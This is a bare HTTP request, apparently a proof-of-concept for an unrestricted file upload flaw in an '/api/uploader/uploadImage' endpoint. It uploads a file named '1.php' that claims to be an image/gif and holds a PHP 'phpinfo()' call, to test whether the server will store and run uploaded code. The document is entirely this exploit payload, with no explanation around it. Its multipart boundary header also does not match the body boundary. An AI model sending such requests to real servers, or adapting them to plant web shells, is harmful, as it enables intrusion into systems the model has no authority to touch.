```

POST /api/uploader/uploadImage HTTP/1.1
Host: xx.xx.xx.xx
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip，deflate，br
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykvjj6DInOLIXxe9m
x-requested-with: XMLHttpRequest

------WebKitFormBoundaryLZbmKeasWgo2gPtU
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/gif

<?php phpinfo();?>
------WebKitFormBoundaryLZbmKeasWgo2gPtU--
```

